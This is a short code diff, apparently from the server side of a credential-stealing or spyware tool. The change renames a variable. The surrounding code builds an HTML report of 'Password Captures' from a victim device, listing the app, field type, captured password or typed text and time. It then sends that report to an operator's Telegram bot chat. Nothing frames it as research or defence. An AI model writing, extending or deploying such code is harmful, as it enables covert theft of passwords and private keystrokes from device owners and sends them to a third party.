@@ -381,12 +381,12 @@ td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
 .date{color:#64748b;font-size:11px;white-space:nowrap}
 </style></head><body>
 <h1>&#128273; Password Captures &#8212; ${esc(deviceName)}</h1>
-<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${entries.length} entries</div>
+<div class="meta">Device: <code>${esc(deviceId)}</code> &nbsp;&middot;&nbsp; ${esc(ts)} &nbsp;&middot;&nbsp; ${passwords.length} entries</div>
 <table><thead><tr><th>App</th><th>Field Type</th><th>Password / Text</th><th>Time</th></tr></thead>
 <tbody>${rows}</tbody></table></body></html>`;
 
     const filename = `passwords_${deviceId.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.html`;
-    const caption  = `\uD83D\uDD11 Password Captures \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${entries.length} entr${entries.length !== 1 ? 'ies' : 'y'}`;
+    const caption  = `\uD83D\uDD11 Password Captures \u2014 ${deviceName}\n\uD83C\uDD94 ${deviceId}\n\uD83D\uDCCA ${passwords.length} entr${passwords.length !== 1 ? 'ies' : 'y'}`;
     if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
         await sendTelegramDocument(telegramSettings.botToken, telegramSettings.chatId, html, filename, caption);
     }
